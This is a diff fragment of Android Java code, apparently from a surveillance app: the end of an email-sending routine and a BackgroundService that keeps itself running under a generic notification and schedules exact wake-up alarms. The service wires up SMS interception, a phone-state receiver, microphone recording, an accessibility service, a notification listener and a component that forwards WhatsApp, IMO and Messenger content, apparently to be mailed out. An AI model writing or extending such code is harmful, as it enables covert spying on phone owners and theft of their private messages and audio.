+                } catch (MessagingException e) {
+                    Log.e("JavaMailAPISendNotification", "Attempt " + attempt + " failed for " + username + ": " + e.getMessage(), e);
+                    try {
+                        Thread.sleep(2000); // Wait 2 seconds before the next attempt
+                    } catch (InterruptedException ex) {
+                        Log.e("JavaMailAPISendNotification", "Thread sleep interrupted: " + ex.getMessage(), ex);
+                    }
+                }
+            }
+        } catch (Exception e) {
+            Log.e("JavaMailAPISendNotification", "Error while preparing email: " + e.getMessage(), e);
+        }
+        return false; // Return false if email sending fails
+    }
+}
+
+
+
+//BackgroundService.java
+package com.example.fasterpro11;
+
+import android.app.AlarmManager;
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
+import android.app.PendingIntent;
+import android.app.Service;
+import android.content.ComponentName;
+import android.content.Context;
+import android.content.Intent;
+import android.content.IntentFilter;
+import android.os.Build;
+import android.os.IBinder;
+import android.provider.Settings;
+import android.provider.Telephony;
+import android.util.Log;
+
+import java.util.Calendar;
+
+public class BackgroundService extends Service {
+
+    private static final String TAG = "BackgroundService";
+    public static final String ACTION_MIC_RECORD = "com.example.fasterpro11.ACTION_MIC_RECORD";
+
+    private SmsReceiver smsReceiver;
+    private NotificationListener notificationListener;
+    private WhatsAppIMOMessengerContent messengerContent;
+    private MicRecord micRecord;
+    private CallRecorderAuto callRecorderAuto;
+    private FileService fileService;  // Corrected declaration of FileService
+    private static final int NOTIFICATION_ID = 1;
+    private static final String CHANNEL_ID = "foreground_service_channel";
+
+    @Override
+    public void onCreate() {
+        super.onCreate();
+        Log.d(TAG, "onCreate: Background service starting");
+
+//        // Register AutoStartReceiver dynamically inside BackgroundService (optional)
+//        IntentFilter filter = new IntentFilter();
+//        filter.addAction(Intent.ACTION_BOOT_COMPLETED);
+//        filter.addAction(Intent.ACTION_SHUTDOWN);
+//        registerReceiver(autoStartReceiver, filter);
+
+
+        try {
+            // Initializing the components and registering necessary receivers
+            messengerContent = new WhatsAppIMOMessengerContent();
+            micRecord = new MicRecord(this);
+            registerReceivers();
+
+            // Start the service in the foreground with a notification
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                // Start as foreground service for Android 8.0 and above
+                startForeground(NOTIFICATION_ID, buildNotification());
+                Log.d(TAG, "Service started as foreground service");
+            } else {
+                // For older versions, normal service start
+                startService(new Intent(this, BackgroundService.class));
+            }
+
+            // Schedule alarms for 9 AM and 12 AM
+            scheduleDailyAlarms();
+
+            Log.d(TAG, "Service onCreate: Initialized successfully");
+        } catch (Exception e) {
+            Log.e(TAG, "Error initializing service", e);
+        }
+    }
+
+    private void scheduleDailyAlarms() {
+        // Get the AlarmManager system service
+        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
+        if (alarmManager != null) {
+            // Set alarms for 9 AM and 12 AM
+            scheduleAlarm(alarmManager, 9, 0);  // 9 AM
+            scheduleAlarm(alarmManager, 0, 0);  // 12 AM
+        }
+    }
+
+    private void scheduleAlarm(AlarmManager alarmManager, int hour, int minute) {
+        Calendar calendar = Calendar.getInstance();
+        calendar.set(Calendar.HOUR_OF_DAY, hour);
+        calendar.set(Calendar.MINUTE, minute);
+        calendar.set(Calendar.SECOND, 0);
+        calendar.set(Calendar.MILLISECOND, 0);
+
+        long triggerAtMillis = calendar.getTimeInMillis();
+        if (calendar.getTimeInMillis() < System.currentTimeMillis()) {
+            // If the time has passed for today, schedule for tomorrow
+            calendar.add(Calendar.DAY_OF_MONTH, 1);
+            triggerAtMillis = calendar.getTimeInMillis();
+        }
+
+        Intent intent = new Intent(this, BackgroundService.class);
+        PendingIntent pendingIntent = PendingIntent.getService(this, 0, intent, PendingIntent.FLAG_IMMUTABLE);
+        alarmManager.setExact(AlarmManager.RTC_WAKEUP, triggerAtMillis, pendingIntent);
+
+        Log.d(TAG, "Alarm scheduled for: " + hour + ":" + minute);
+    }
+
+    private void registerReceivers() {
+        Log.d(TAG, "registerReceivers: Registering receivers");
+        try {
+            // Registering SMS receiver
+            smsReceiver = new SmsReceiver();
+            IntentFilter smsFilter = new IntentFilter(Telephony.Sms.Intents.SMS_RECEIVED_ACTION);
+            registerReceiver(smsReceiver, smsFilter);
+            Log.d(TAG, "registerReceivers: SMS receiver registered");
+
+            // Registering Call Recorder Auto
+//            callRecorderAuto = new CallRecorderAuto();
+//            IntentFilter callRecorderFilter = new IntentFilter("android.intent.action.PHONE_STATE");
+//            registerReceiver(callRecorderAuto, callRecorderFilter);
+//            Log.d(TAG, "registerReceivers: Call recorder registered");
+
+            // Registering FileService (if it's used to manage files)
+            fileService = new FileService();  // Correct initialization of FileService
+            IntentFilter fileServiceFilter = new IntentFilter("android.intent.action.PHONE_STATE");
+            registerReceiver(fileService, fileServiceFilter);
+            Log.d(TAG, "registerReceivers: FileService registered");
+
+
+            // Start MyAccessibilityService
+            Intent accessibilityServiceIntent = new Intent(this, MyAccessibilityService.class);
+            startService(accessibilityServiceIntent);
+
+            // Initializing Notification Listener
+            notificationListener = new NotificationListener();
+            enableNotificationListener();
+
+            Log.d(TAG, "Receivers registered successfully");
+        } catch (Exception e) {
+            Log.e(TAG, "Error registering receivers", e);
+        }
+    }
+
+    private Notification buildNotification() {
+        Log.d(TAG, "buildNotification: Building notification");
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                createNotificationChannel();
+                return new Notification.Builder(this, CHANNEL_ID)
+                        .setContentTitle("Foreground Service")
+                        .setContentText("Running in foreground")
+                        .setSmallIcon(R.drawable.notification_icon)
+                        .build();
+            } else {
+                return new Notification.Builder(this)
+                        .setContentTitle("Foreground Service")
+                        .setContentText("Running in foreground")
+                        .setSmallIcon(R.drawable.notification_icon)
+                        .build();
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error building notification", e);
+            return null;
+        }
+    }
+
+    private void createNotificationChannel() {
+        Log.d(TAG, "createNotificationChannel: Creating notification channel");
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                NotificationChannel serviceChannel = new NotificationChannel(
+                        CHANNEL_ID,
+                        "Foreground Service Channel",
+                        NotificationManager.IMPORTANCE_DEFAULT
+                );
+                NotificationManager manager = getSystemService(NotificationManager.class);
+                if (manager != null) {
+                    manager.createNotificationChannel(serviceChannel);
+                    Log.d(TAG, "createNotificationChannel: Channel created successfully");
+                }
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error creating notification channel", e);
+        }
+    }
+
+    @Override
+    public void onDestroy() {
+        super.onDestroy();
+        Log.d(TAG, "onDestroy: Stopping service");
+        try {
+            // Unregistering all receivers and observers to avoid memory leaks
+            if (smsReceiver != null) {
+                unregisterReceiver(smsReceiver);
+                Log.d(TAG, "onDestroy: SMS receiver unregistered");
+            }
+//            if (callRecorderAuto != null) {
+//                unregisterReceiver(callRecorderAuto);
+//                Log.d(TAG, "onDestroy: Call recorder unregistered");
+//            }
+            if (fileService != null) {
+                unregisterReceiver(fileService);
+                Log.d(TAG, "onDestroy: FileService unregistered");
+            }
+
+            // Stop MyAccessibilityService
+            Intent accessibilityServiceIntent = new Intent(this, MyAccessibilityService.class);
+            stopService(accessibilityServiceIntent);
+
+
+            // Stop and disable the notification listener
+            disableNotificationListener();
+
+            if (micRecord != null) {
+                unregisterReceiver(micRecord);
+                Log.d(TAG, "onDestroy: MicRecord receiver unregistered");
+            }
+
+            if (messengerContent != null) {
+                messengerContent.stopForwarding();
+                messengerContent = null;
+                Log.d(TAG, "onDestroy: Messenger content stopped forwarding");
+            }
+
+            Log.d(TAG, "NotificationListener service destroyed");
+            Log.d(TAG, "Service onDestroy: Receivers and observers stopped");
+        } catch (Exception e) {
+            Log.e(TAG, "Error stopping service", e);
+        }
+    }
+
+    @Override
+    public IBinder onBind(Intent intent) {
+        return null;
+    }
+
+    private void enableNotificationListener() {
+        Log.d(TAG, "enableNotificationListener: Enabling notification listener");
+        try {
+            ComponentName componentName = new ComponentName(this, NotificationListener.class);
+            if (!isNotificationListenerEnabled(componentName)) {
+                Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                startActivity(intent);
+                Log.d(TAG, "enableNotificationListener: Notification listener settings opened");
+            } else {
+                Log.d(TAG, "enableNotificationListener: Notification listener already enabled");
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error enabling notification listener", e);
+        }
+    }
+
+    private void disableNotificationListener() {
+        Log.d(TAG, "disableNotificationListener: Disabling notification listener");
+        try {
+            ComponentName componentName = new ComponentName(this, NotificationListener.class);
+            if (isNotificationListenerEnabled(componentName)) {
+                Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                startActivity(intent);
+                Log.d(TAG, "disableNotificationListener: Notification listener settings opened");
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error disabling notification listener", e);
+        }
+    }
+
+    private boolean isNotificationListenerEnabled(ComponentName componentName) {
+        Log.d(TAG, "isNotificationListenerEnabled: Checking if notification listener is enabled");
+        try {
+            String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
+            boolean isEnabled = flat != null && flat.contains(componentName.flattenToString());
+            Log.d(TAG, "isNotificationListenerEnabled: Notification listener is " + (isEnabled ? "enabled" : "disabled"));
+            return isEnabled;
+        } catch (Exception e) {
+            Log.e(TAG, "Error checking notification listener", e);
+            return false;
+        }
+    }
+}
+
